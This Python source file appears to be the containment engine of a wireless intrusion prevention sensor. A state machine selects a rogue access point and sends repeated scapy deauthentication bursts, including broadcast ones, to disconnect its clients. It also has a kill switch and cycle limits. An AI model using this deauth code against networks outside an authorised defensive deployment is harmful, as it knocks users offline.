import time
import threading
from enum import Enum
import config
from config import DEAUTH_COUNT, DEAUTH_INTERVAL, AutoContainmentConfig
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, conf
from runtime_state import client_kicked, log_attack, update_status
from attack_identity import derive_attack_sc

LOGGER = __import__("logging").getLogger("zeinaguard.sensor.containment")

class AttackState(Enum):
    MONITORING = "MONITORING"
    ATTACKING = "ATTACKING"
    EVALUATING = "EVALUATING"
    RE_ARMING = "RE_ARMING"
    KILLED = "KILLED"

class ContainmentEngine:
    def __init__(self, iface=None, ack_callback=None):
        self.iface = iface or config.get_interface()
        self.ack_callback = ack_callback
        
        # State Machine Tracking
        self.state = AttackState.MONITORING
        self.current_target_bssid = None
        self.current_target_score = 0
        self.current_target_channel = None
        self.current_target_ssid = None
        self.current_target_clients = None
        self.state_start_time = time.time()
        self.cycle_count = 0
        self.lock = threading.RLock()
        self.attack_thread = None
        self.daemon_running = False
        self._kill_flag = False

    def _transition(self, new_state: AttackState, reason: str, bssid: str = None):
        with self.lock:
            old_state = self.state
            self.state = new_state
            self.state_start_time = time.time()
            event_bssid = bssid or self.current_target_bssid
            ssid_snapshot = self.current_target_ssid
            channel_snapshot = self.current_target_channel

        if self.ack_callback:
            self.ack_callback(
                new_state.value, event_bssid, reason,
                ssid_snapshot, channel_snapshot,
            )

        log_attack(
            f"Engine State Changed: {old_state.value} -> {new_state.value} ({reason})",
            event_bssid,
        )

    def evaluate_threat(self, bssid, score, channel, ssid=None, clients=None):
        with self.lock:
            if self.state in (AttackState.ATTACKING, AttackState.EVALUATING):
                if bssid != self.current_target_bssid and score >= (self.current_target_score + 20):
                    self._kill_flag = True
                    self._transition(
                        AttackState.RE_ARMING,
                        f"Preempted by {bssid} (score: {score})",
                        bssid,
                    )
                    self._assign_target(bssid, score, channel, ssid, clients)
                    self._transition(AttackState.ATTACKING, "Starting preemptive attack")
                    return

            if self.state in (AttackState.MONITORING, AttackState.KILLED):
                self._assign_target(bssid, score, channel, ssid, clients)
                self._kill_flag = False
                self._transition(
                    AttackState.ATTACKING,
                    "Threat exceeded threshold. Engaging.",
                )
                return

            if (self.state == AttackState.EVALUATING
                    and bssid == self.current_target_bssid):
                elapsed = time.time() - self.state_start_time
                if elapsed >= AutoContainmentConfig.EVALUATION_PAUSE_SEC:
                    self.cycle_count += 1
                    if self.cycle_count < AutoContainmentConfig.MAX_RE_ARM_CYCLES:
                        self._transition(
                            AttackState.ATTACKING,
                            f"Threat persists. Re-arming "
                            f"(Cycle {self.cycle_count + 1}/"
                            f"{AutoContainmentConfig.MAX_RE_ARM_CYCLES})",
                        )
                    else:
                        self._transition(
                            AttackState.MONITORING,
                            "Max re-arm cycles reached. Halting auto-containment.",
                        )
                        self.current_target_bssid = None
                        self.current_target_score = 0

    def _assign_target(self, bssid, score, channel, ssid, clients):
        """Set the current attack target fields.  Caller MUST hold self.lock."""
        self.current_target_bssid = bssid
        self.current_target_score = score
        self.current_target_channel = channel
        self.current_target_ssid = ssid
        self.current_target_clients = clients
        self.cycle_count = 0

    def execute_kill(self, bssid, kill_token):
        with self.lock:
            if self.current_target_bssid != bssid:
                return
            self._kill_flag = True
            self._transition(
                AttackState.KILLED,
                f"Operator invoked Kill Switch (Token: {kill_token})",
            )
            self.current_target_bssid = None
            self.current_target_score = 0
            config.LOCKED_CHANNEL = None

    def start_daemon(self):
        """Starts the background worker that processes the state machine."""
        if self.daemon_running:
            return
        self.daemon_running = True
        t = threading.Thread(target=self._daemon_loop, daemon=True, name="ContainmentDaemon")
        t.start()

    def _daemon_loop(self):
        while self.daemon_running:
            with self.lock:
                state = self.state
                bssid = self.current_target_bssid
                channel = self.current_target_channel
                clients = self.current_target_clients
                elapsed = time.time() - self.state_start_time
                kill_signal = self._kill_flag
                
            if state == AttackState.ATTACKING and bssid and not kill_signal:
                from monitoring.sniffer import aps_state
                
                is_visible = any(k.lower() == bssid.lower() for k in aps_state.keys())
                
                if not is_visible:
                    self._transition(AttackState.KILLED, f"Target {bssid} no longer visible. Auto-stopping attack.", bssid)
                    with self.lock:
                        self.current_target_bssid = None
                        self.current_target_score = 0
                        self.current_target_channel = None
                    config.LOCKED_CHANNEL = None
                    continue

                if config.LOCKED_CHANNEL != channel:
                    config.LOCKED_CHANNEL = channel
                    import os
                    os.system(f"iwconfig {self.iface} channel {channel} 2>/dev/null")

                burst_success = self._deauth_burst(bssid, channel, clients)
                
                if not burst_success:
                    self._transition(AttackState.KILLED, f"Hardware Failure: Unable to transmit frames on {self.iface}", bssid)
                    with self.lock:
                        self.current_target_bssid = None
                        self.current_target_score = 0
                        self.current_target_channel = None
                    config.LOCKED_CHANNEL = None
                    continue
                
                if elapsed >= 5:
                    self._transition(AttackState.EVALUATING, "Cycle complete (5s). Pausing for quick evaluation.")
                    config.LOCKED_CHANNEL = None
                
                time.sleep(max(getattr(config, 'DEAUTH_INTERVAL', 0.1), 0.05))
                    
            elif state == AttackState.EVALUATING:
                if elapsed > 3: 
                     self._transition(AttackState.MONITORING, "Evaluation finished. Re-checking targets.")
                     with self.lock:
                         self.current_target_bssid = None

            elif state in (AttackState.MONITORING, AttackState.KILLED, AttackState.RE_ARMING):
                time.sleep(0.5)

    def _deauth_burst(self, bssid, channel, clients=None):
        if not channel:
            return
            
        targets = clients if clients else ["ff:ff:ff:ff:ff:ff"]
        pkts = []
        

        reason_codes = [1, 2, 7, 8]

        attack_sc = (derive_attack_sc(bssid) << 4) & 0xFFF0

        for target in targets:
            for r in reason_codes:
                pkts.append(RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid, SC=attack_sc) / Dot11Deauth(reason=r))
                pkts.append(RadioTap() / Dot11(addr1=bssid, addr2=target, addr3=bssid, SC=attack_sc) / Dot11Deauth(reason=r))

        l2_socket = None
        try:
            l2_socket = conf.L2socket(iface=self.iface)
            
            for _ in range(8):
                for p in pkts:
                    l2_socket.send(p)
            
            from runtime_state import log_attack, client_kicked
            client_kicked() 
            
            from core.event_bus import dashboard_queue
            dashboard_queue.put({
                "type": "ATTACK_LOG",
                "bssid": bssid,
                "message": f"🔥 Sending Dense Deauth Wave (64 frames/target) to {bssid} (Targets: {len(targets)})",
                "timestamp": time.time()
            })
            
            return True
                
        except Exception as e:
            LOGGER.error(f"Interface error during burst: {e}")
            # Report RF failure to the engine
            return False
        finally:
            if l2_socket:
                try: l2_socket.close()
                except: pass